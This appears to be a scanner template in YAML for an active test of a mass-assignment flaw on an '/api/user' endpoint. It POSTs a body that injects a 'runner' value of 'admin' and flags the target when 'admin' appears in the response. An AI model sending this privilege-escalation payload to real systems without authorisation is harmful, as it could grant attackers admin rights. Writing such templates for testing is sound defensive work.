id: mass3-086
name: 'Mass field runner'
severity: high
type: active
tags:
  - mass-assignment
  - auth
  - api
description: 'Unfiltered runner on /api/user'
requests:
  - method: POST
    path: '{{BaseURL}}/api/user'
    body: '{"name":"u1","runner":"admin"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
